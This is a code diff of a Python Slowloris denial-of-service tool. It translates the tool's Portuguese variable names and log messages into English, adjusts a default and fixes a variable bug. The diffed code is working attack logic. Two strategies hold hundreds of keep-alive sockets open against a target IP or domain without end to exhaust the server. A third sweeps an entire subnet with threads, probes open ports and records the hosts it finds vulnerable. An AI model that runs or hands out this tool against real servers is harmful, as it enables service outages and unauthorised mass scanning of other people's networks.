@@ -10,15 +10,15 @@ from typing import List
 from .sockets import (
     init_socket,
     iteration_keepalive,
-    ip_ativo,
-    porta_ativa,
+    is_ip_reachable,
+    is_port_open,
 )
 
-DEFAULT_SOCKETS = 200
+DEFAULT_SOCKETS = 150
 DEFAULT_SLEEP = 15
 DEFAULT_THREADS = 50
 DEFAULT_ATTACK_SECONDS = 120
-RESULT_FILE = "resultado_slowloris.txt"
+RESULT_FILE = "slowloris_results.txt"
 
 
 @dataclass
@@ -42,25 +42,25 @@ class SniperStrategy(Strategy):
 
     def execute(self) -> None:
         logging.info(f"[SNIPER] {self.ip}:{self.port} | sockets={self.opts.sockets} | https={self.opts.https}")
-        socks: List[socket.socket] = []
+        sock_list: List[socket.socket] = []
         for _ in range(self.opts.sockets):
             s = init_socket(self.ip, self.port, self.opts.https, self.opts.randua)
             if s:
-                socks.append(s)
+                sock_list.append(s)
         while True:
             try:
-                logging.info(f"Enviando keep-alive... ({len(socks)} sockets ativos)")
+                logging.info(f"Sending keep-alive... ({len(sock_list)} active sockets)")
                 iteration_keepalive(
-                    socks, self.opts.sockets, self.ip, self.port,
+                    sock_list, self.opts.sockets, self.ip, self.port,
                     self.opts.https, self.opts.randua, None, None
                 )
                 time.sleep(self.opts.sleeptime)
             except (KeyboardInterrupt, SystemExit):
-                logging.info("Encerrando (Ctrl+C)…")
+                logging.info("Shutting down (Ctrl+C)…")
                 break
             except Exception as e:
-                logging.debug(f"Erro no loop: {e}")
-        for s in socks:
+                logging.debug(f"Loop error: {e}")
+        for s in sock_list:
             try:
                 s.close()
             except Exception:
@@ -77,27 +77,27 @@ class DomainStrategy(Strategy):
     def execute(self) -> None:
         logging.info(
             f"[DOMAIN] {self.host} ({self.ip}):{self.port} | sockets={self.opts.sockets} | https={self.opts.https}")
-        socks: List[socket.socket] = []
+        sock_list: List[socket.socket] = []
         for _ in range(self.opts.sockets):
             s = init_socket(self.ip, self.port, self.opts.https, self.opts.randua,
                             host_header=self.host, sni_name=self.host if self.opts.https else None)
             if s:
-                socks.append(s)
+                sock_list.append(s)
         while True:
             try:
-                logging.info(f"Enviando keep-alive... ({len(socks)} sockets ativos)")
+                logging.info(f"Sending keep-alive... ({len(sock_list)} active sockets)")
                 iteration_keepalive(
-                    socks, self.opts.sockets, self.ip, self.port,
+                    sock_list, self.opts.sockets, self.ip, self.port,
                     self.opts.https, self.opts.randua,
                     host_header=self.host, sni_name=self.host if self.opts.https else None
                 )
                 time.sleep(self.opts.sleeptime)
             except (KeyboardInterrupt, SystemExit):
-                logging.info("Encerrando (Ctrl+C)…")
+                logging.info("Shutting down (Ctrl+C)…")
                 break
             except Exception as e:
-                logging.debug(f"Erro no loop: {e}")
-        for s in socks:
+                logging.debug(f"Loop error: {e}")
+        for s in sock_list:
             try:
                 s.close()
             except Exception:
@@ -114,15 +114,15 @@ class PitchforkStrategy(Strategy):
         self.max_threads = max_threads
 
     def _test_target(self, ip: str, port: int) -> bool:
-        logging.info(f"[+] Testando {ip}:{port} por {self.duration_s}s (sockets={self.opts.sockets})")
-        socks: List[socket.socket] = []
+        logging.info(f"[+] Testing {ip}:{port} for {self.duration_s}s (sockets={self.opts.sockets})")
+        sock_list: List[socket.socket] = []
         for _ in range(self.opts.sockets):
             s = init_socket(ip, port, self.opts.https, self.opts.randua)
             if s:
-                socks.append(s)
-        if len(socks) < self.opts.sockets:
-            logging.info(f"[-] Não foi possível criar todos os {self.opts.sockets} sockets.")
-            for s in socks:
+                sock_list.append(s)
+        if len(sock_list) < self.opts.sockets:
+            logging.info(f"[-] Could not create all {self.opts.sockets} sockets.")
+            for s in sock_list:
                 try:
                     s.close()
                 except Exception:
@@ -131,50 +131,51 @@ class PitchforkStrategy(Strategy):
         start = time.time()
         total_recreated = 0
         while time.time() - start < self.duration_s:
-            before = len(socks)
-            iteration_keepalive(socks, self.opts.sockets, ip, port, self.opts.https, self.opts.randua, None, None)
-            recreated = max(0, len(socks) - before)
+            before = len(sock_list)
+            iteration_keepalive(sock_list, self.opts.sockets, ip, port, self.opts.https, self.opts.randua, None, None)
+            recreated = max(0, len(sock_list) - before)
             total_recreated += recreated
-            logging.info(f"[{ip}:{port}] ativos={len(socks)}/{self.opts.sockets} | recriados_ciclo={recreated}")
+            logging.info(
+                f"[{ip}:{port}] active={len(sock_list)}/{self.opts.sockets} | recreated_this_cycle={recreated}")
             time.sleep(10)
-        for s in socks:
+        for s in sock_list:
             try:
                 s.close()
             except Exception:
                 pass
         if total_recreated == 0:
-            logging.info(f"[VULNERAVEL] {ip}:{port} – manteve 100% dos sockets.")
+            logging.info(f"[VULNERABLE] {ip}:{port} – kept 100% of sockets.")
             return True
-        logging.info(f"[SEGURO] {ip}:{port} – {total_recriados} sockets precisaram ser recriados.")
+        logging.info(f"[SAFE] {ip}:{port} – {total_recreated} sockets had to be recreated.")
         return False
 
     def _process_ip(self, ip: str) -> List[str]:
-        achados: List[str] = []
-        if not ip_ativo(ip):
-            logging.info(f"[-] IP inativo: {ip}")
-            return achados
+        findings: List[str] = []
+        if not is_ip_reachable(ip):
+            logging.info(f"[-] Inactive IP: {ip}")
+            return findings
         for p in self.ports:
-            if porta_ativa(ip, p):
+            if is_port_open(ip, p):
                 if self._test_target(ip, p):
-                    achados.append(f"[VULNERAVEL] {ip}:{p}\n")
+                    findings.append(f"[VULNERABLE] {ip}:{p}\n")
             else:
-                logging.info(f"[-] Porta {p} inativa em {ip}")
-        return achados
+                logging.info(f"[-] Port {p} inactive on {ip}")
+        return findings
 
     def execute(self) -> None:
         logging.info(
-            f"[PITCHFORK] Sub-rede={self.subnet} | portas={self.ports} | sockets={self.opts.sockets} | https={self.opts.https} | duração={self.duration_s}s")
-        resultados: List[str] = []
+            f"[PITCHFORK] Subnet={self.subnet} | ports={self.ports} | sockets={self.opts.sockets} | https={self.opts.https} | duration={self.duration_s}s")
+        results: List[str] = []
         with ThreadPoolExecutor(max_workers=self.max_threads) as ex:
             futures = {ex.submit(self._process_ip, str(ip)): str(ip) for ip in self.subnet}
             for fut in as_completed(futures):
                 try:
-                    resultados.extend(fut.result())
+                    results.extend(fut.result())
                 except Exception as e:
-                    logging.error(f"Erro ao processar {futures[fut]}: {e}")
-        if resultados:
+                    logging.error(f"Error processing {futures[fut]}: {e}")
+        if results:
             with open(RESULT_FILE, "w", encoding="utf-8") as f:
-                f.writelines(resultados)
-            logging.info(f"[+] Resultados salvos em {RESULT_FILE}")
+                f.writelines(results)
+            logging.info(f"[+] Results saved to {RESULT_FILE}")
         else:
-            logging.info("[+] Nenhuma vulnerabilidade encontrada.")
+            logging.info("[+] No vulnerabilities found.")
